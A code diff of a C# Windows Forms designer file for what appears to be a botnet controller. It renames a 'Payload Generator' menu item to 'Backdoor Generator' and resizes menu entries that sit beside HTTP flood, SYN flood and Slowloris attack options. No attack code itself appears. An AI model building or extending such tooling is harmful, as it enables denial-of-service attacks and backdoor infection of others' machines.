@@ -69,7 +69,7 @@
             this.fileToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
             this.addToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
             this.pingClientsToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
-            this.generatePayloadToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
+            this.backdoorGeneratorStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
             this.getMyIPToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
             this.attackToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
             this.hTTPFloodToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
@@ -413,7 +413,7 @@
             this.fileToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
             this.addToolStripMenuItem,
             this.pingClientsToolStripMenuItem,
-            this.generatePayloadToolStripMenuItem,
+            this.backdoorGeneratorStripMenuItem,
             this.getMyIPToolStripMenuItem});
             this.fileToolStripMenuItem.Name = "fileToolStripMenuItem";
             this.fileToolStripMenuItem.Size = new System.Drawing.Size(37, 20);
@@ -422,26 +422,26 @@
             // addToolStripMenuItem
             // 
             this.addToolStripMenuItem.Name = "addToolStripMenuItem";
-            this.addToolStripMenuItem.Size = new System.Drawing.Size(171, 22);
+            this.addToolStripMenuItem.Size = new System.Drawing.Size(179, 22);
             this.addToolStripMenuItem.Text = "Add Client";
             // 
             // pingClientsToolStripMenuItem
             // 
             this.pingClientsToolStripMenuItem.Name = "pingClientsToolStripMenuItem";
-            this.pingClientsToolStripMenuItem.Size = new System.Drawing.Size(171, 22);
+            this.pingClientsToolStripMenuItem.Size = new System.Drawing.Size(179, 22);
             this.pingClientsToolStripMenuItem.Text = "Ping All Clients";
             // 
-            // generatePayloadToolStripMenuItem
+            // backdoorGeneratorStripMenuItem
             // 
-            this.generatePayloadToolStripMenuItem.Name = "generatePayloadToolStripMenuItem";
-            this.generatePayloadToolStripMenuItem.Size = new System.Drawing.Size(171, 22);
-            this.generatePayloadToolStripMenuItem.Text = "Payload Generator";
-            this.generatePayloadToolStripMenuItem.Click += new System.EventHandler(this.generatePayloadToolStripMenuItem_Click);
+            this.backdoorGeneratorStripMenuItem.Name = "backdoorGeneratorStripMenuItem";
+            this.backdoorGeneratorStripMenuItem.Size = new System.Drawing.Size(179, 22);
+            this.backdoorGeneratorStripMenuItem.Text = "Backdoor Generator";
+            this.backdoorGeneratorStripMenuItem.Click += new System.EventHandler(this.backdoorGeneratorToolStripMenuItem_Click);
             // 
             // getMyIPToolStripMenuItem
             // 
             this.getMyIPToolStripMenuItem.Name = "getMyIPToolStripMenuItem";
-            this.getMyIPToolStripMenuItem.Size = new System.Drawing.Size(171, 22);
+            this.getMyIPToolStripMenuItem.Size = new System.Drawing.Size(179, 22);
             this.getMyIPToolStripMenuItem.Text = "Get My IP";
             this.getMyIPToolStripMenuItem.Click += new System.EventHandler(this.getMyIPToolStripMenuItem_Click);
             // 
@@ -867,7 +867,7 @@
         private System.Windows.Forms.ToolStripMenuItem hTTPFloodToolStripMenuItem;
         private System.Windows.Forms.ToolStripMenuItem sYNFloodToolStripMenuItem;
         private System.Windows.Forms.ToolStripMenuItem pingToolStripMenuItem;
-        private System.Windows.Forms.ToolStripMenuItem generatePayloadToolStripMenuItem;
+        private System.Windows.Forms.ToolStripMenuItem backdoorGeneratorStripMenuItem;
         private System.Windows.Forms.ToolStripMenuItem hTTPFloodToolStripMenuItem1;
         private System.Windows.Forms.ToolStripMenuItem sYNFloodToolStripMenuItem1;
         private System.Windows.Forms.ToolStripMenuItem slolorisToolStripMenuItem;
